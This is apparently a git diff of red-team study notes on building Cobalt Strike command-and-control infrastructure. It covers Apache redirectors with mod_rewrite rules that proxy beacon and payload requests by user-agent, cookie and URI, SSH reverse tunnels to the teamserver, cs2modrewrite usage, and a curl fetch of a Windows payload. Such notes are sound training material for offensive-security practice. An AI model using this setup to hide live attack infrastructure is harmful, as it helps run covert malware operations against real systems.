@@ -3,7 +3,7 @@ import { Callout } from 'nextra-theme-docs'
 
 ### C2 Infrastructure
 ![c2_infra](/images/c2_infra.png)
-<Callout type="info" emoji="ℹ️">
+<Callout type="info" emoji="👻">
   The traffic between the **redirector** and the **teamserver** can be in either HTTP or HTTPS. and It can be off-loaded on the **redirector** and let the traffic between the **redirector** and the **teamserver** in plain HTTP as It will be already tunneled inside **SSH**
 </Callout>
 
@@ -40,18 +40,18 @@ SSLCertificateFile      /etc/ssl/certs/public.crt
 SSLCertificateKeyFile /etc/ssl/private/private.key
 
 ```
-<Callout type="info" emoji="ℹ️">
+<Callout type="info" emoji="👻">
   We can just use the **public.crt** and **private.key** without getting them signed by a public CA, but have to configure the apache server to ignore the self-signed certificate
   by adding this line to the apache configuration file `SSLProxyCheckPeerCN off`. This is required to tell Apache to ignore that the SSL certificate on Cobalt Strike's HTTPS listener is self-signed.
 </Callout>
-<Callout type="info" emoji="ℹ️">
+<Callout type="info" emoji="👻">
   To sign the certificate with from a public CA we can use **certbot** and **letsencrypt**
 </Callout>
 
 
 #### Configure SSL on the Team server
 Because the CobaltStrike's teamserver is written in java, we'll have to import the private key and the public certificate into a java keystore.
-<Callout type="info" emoji="ℹ️">
+<Callout type="info" emoji="👻">
   We'll use the same private key and certificate generated on the **redirector** machine.
 </Callout>
   1. Import the private key and the certificate into a **pkcs12** file
@@ -69,7 +69,7 @@ Because the CobaltStrike's teamserver is written in java, we'll have to import t
      set password "password";
       }
      ```
-     <Callout type="info" emoji="ℹ️">
+     <Callout type="info" emoji="👻">
       The java keystore must be in the same directory as the C2 server
      </Callout>  
   4. Launch the teamserver
@@ -84,11 +84,11 @@ Because the CobaltStrike's teamserver is written in java, we'll have to import t
         # On the teamserver
         ssh -N -R 8443:localhost:443 -i ssh-user ssh-user@redirector
         ```
-        <Callout type="info" emoji="ℹ️">
+        <Callout type="info" emoji="👻">
         **Where**
         - `-N`   Stops the session from dropping in to a shell.
-        - `8443` HTTPS port on redirector machine.
-        - `443`  HTTPS port on team server.
+        - `8443` HTTPS port on **redirector** machine listening on localhost.
+        - `443`  HTTPS port on **teamserver** listening on localhost.
         </Callout>
         Now, whoever connects to port `8443` on the **redirector** machine, his traffic will be redirected to port `443` on the **teamserver**
 
@@ -109,7 +109,7 @@ Because the CobaltStrike's teamserver is written in java, we'll have to import t
         ```bash copy
         autossh -M 0 -f -N redirector-1
         ```
-        <Callout type="info" emoji="ℹ️">
+        <Callout type="info" emoji="👻">
         **Where**
         - `-M 0`  disables the autossh monitoring port (in favour of OpenSSH's built-in ServerAliveInterval and ServerAliveCountMax capabilities).
         - `-f` tells autossh to run in the background.
@@ -139,12 +139,12 @@ By looking at the following diagram, we already configured everything, except th
   RewriteRule ^test$ index.html [NC]
   ```
    
-  <Callout type="info" emoji="ℹ️">
+  <Callout type="info" emoji="👻">
     **RewriteRule**: 
 
     Example: `RewriteRule <Regx> <epattern> <substitution> [flags]`
   </Callout>
-  <Callout type="info" emoji="ℹ️">
+  <Callout type="info" emoji="👻">
     **Some useful flags**
     - `[L]` (Last)  Tells mod_rewrite to stop processing further rules.
     - `[NE]` (No Escape).  Don't encode special characters (e.g. & and ?) to their hex values.
@@ -154,7 +154,7 @@ By looking at the following diagram, we already configured everything, except th
     - `[T]` (Type)  Sets the MIME type of the response.
     - Example:  `[L, NE, P]`
   </Callout>
-  <Callout type="info" emoji="ℹ️">
+  <Callout type="info" emoji="👻">
     **RewriteCond**:
      
     - When combined with **RewriteRule** allows  rewrite rules to only be applied under certain conditions
@@ -177,8 +177,63 @@ By looking at the following diagram, we already configured everything, except th
   RewriteCond %{HTTP_USER_AGENT} "Windows NT 10.0" [NC]
   RewriteRule .* https://localhost:8443/win-payload [P]
   ```
-  <Callout type="info" emoji="ℹ️">
+  <Callout type="info" emoji="👻">
     The `[P]` or Proxy directive is special because it proxies the request to our backend server in a way that's transparent to the requesting party.
   </Callout>
+
+  We can change User-Agent string for a curl request like this
+  ```bash copy
+  curl -k -A "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" https://localhost/win-payload.exe
+  ```
 ###### Cookie Rules
-###### URI Rules 
+- We can sue a cookie in the request to send info like meta data or like a canary to only redirect the request if this cookie exists
+- We can do that by using this variable
+  ```json copy
+  RewriteEngine on
+  RewriteCond %{HTTP_COOKIE} TestCookie [NC]
+  RewriteRule .* https://localhost:8443/cookie-test [P]
+  ```
+###### URI & Query String Rules 
+- The **URI** is anything that comes after the hostname and the port  
+- The **Query String** is anything that comes after the URI, which is the GET parameters and their values in the URL
+- Example:
+  - Stating with 
+    ```json copy
+    RewriteEngine on
+
+      RewriteCond %{REQUEST_URI} win-payload [NC]
+      RewriteRule .* https://localhost:8443%{REQUEST_URI} [P]
+
+      RewriteCond %{REQUEST_URI} __utm.gif [NC]
+      RewriteRule .* https://localhost:8443%{REQUEST_URI} [P]
+    ```
+    - `win-payload` --> is used by the beacon to download the  payload.
+    - `___utm.gif`  --> is used with `GET` requests
+    - `____utm.gif` --> is used  with `POST` requests (notice the number of underscores 😄)
+
+- Until now, the traffic will be redirected based on the **URI** only, lets narrow it down by putting **Query String** based rules, We can go to the C2 profile to know which parameters are being used by this profile then we can filter on them
+- To be revisited while practicing the lab
+
+###### cs2modrewrite
+- We can use this tool to automatically generate `.htaccess` rewrite rules from c2.profile files.
+- First, change the user agent in the profile using this line as a global config outside the `GET` and `POST` blocks
+  ```json copy
+  set useragent "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko";
+  ```
+- Generate the rewrite rules
+  ```bash copy wordWrap=true
+  python3 cs2modrewrite.py -i ~/cobaltstrike/c2-profiles/normal/webbug_getonly.profile -c https://localhost:8443 -r https://www.google.com/ -o webbug_getonly_htaccess
+  ```
+<Callout type="info" emoji="👻">
+  - `-i` is the malleable C2 profile.
+  - `-c` is the location of the Team Server.
+  - `-r` is a URL to redirect "invalid" traffic to.
+  - `-o` is an output file.
+</Callout>
+
+### C2 Reseliency
+- Can be achieved using multiple redirectors, in case one or more of them get blocked, the beacon can failover to other un-blocked ones.
+- To be revisited while using the lab
+
+### Beacon Staging
+
